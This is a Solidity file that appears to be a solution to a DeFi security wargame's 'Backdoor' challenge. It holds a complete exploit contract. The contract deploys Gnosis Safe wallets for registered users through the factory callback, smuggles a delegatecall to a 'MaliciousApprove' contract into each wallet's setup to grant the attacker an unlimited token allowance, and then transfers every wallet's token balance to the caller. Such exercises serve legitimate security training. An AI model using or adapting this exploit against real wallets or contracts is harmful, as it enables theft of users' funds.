// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../backdoor/WalletRegistry.sol";

interface IGnosisFactory {
    function createProxyWithCallback(
        address _singleton,
        bytes memory initializer,
        uint256 saltNonce,
        IProxyCreationCallback callback
    ) external returns (GnosisSafeProxy proxy);
}

contract MaliciousApprove {
    function approve(address attacker, IERC20 token) public {
        token.approve(attacker, type(uint256).max);
    }
}

contract AttackBackdoor {

    WalletRegistry private immutable walletRegistry;
    IGnosisFactory private immutable factory;
    GnosisSafe private immutable masterCopy;
    IERC20 private immutable token;
    MaliciousApprove private immutable maliciousApprove;

    constructor(address _walletRegistry, address[] memory users){
        
        // Set state variables
        walletRegistry = WalletRegistry(_walletRegistry);
        masterCopy = GnosisSafe(payable(walletRegistry.masterCopy()));
        factory = IGnosisFactory(walletRegistry.walletFactory());
        token = IERC20(walletRegistry.token());

        // Deploy malicious backdoor for approve
        maliciousApprove = new MaliciousApprove();

        // Create a new safe through the factory for every user

        bytes memory initializer;
        address[] memory owners = new address[](1);
        address wallet;

        for(uint256 i; i < users.length; i++) {
            
            owners[0] = users[i];
            initializer = abi.encodeCall(GnosisSafe.setup, (
                owners,
                1,
                address(maliciousApprove),
                abi.encodeCall(maliciousApprove.approve, (address(this), token)),
                address(0),
                address(0),
                0,
                payable(address(0))
            ));
            
            wallet = address(factory.createProxyWithCallback(
                address(masterCopy),
                initializer,
                0,
                walletRegistry
            ));

            token.transferFrom(wallet, msg.sender, token.balanceOf(wallet));
        }

    }
}